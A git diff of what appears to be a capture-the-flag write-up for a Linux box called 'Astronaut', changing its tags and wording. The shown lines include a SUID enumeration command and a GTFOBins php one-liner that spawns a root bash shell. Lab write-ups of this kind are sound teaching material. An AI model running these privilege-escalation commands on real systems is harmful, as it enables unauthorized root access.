@@ -1,4 +1,4 @@
-##### Tags: `cronjob`  `CVE-2021–22204`  `searchsploit`  `User-add`
+##### Tags: `SUID`  `php`  `searchsploit`  `GTFOBin`
 
 # 🐧Astronaut🐧
 ## Enumeration
@@ -67,7 +67,7 @@ search for SUID bit and found php
 $ find / -perm -4000 -type f 2>/dev/null
 /usr/bin/php7.4
 ```
-From gtfobin, we can get root if php running suid bit
+From gtfobin, we can get root if php running with suid bit  
 https://gtfobins.org/gtfobins/php/
 ```
 php -r "pcntl_exec('/bin/bash', ['-p']);"
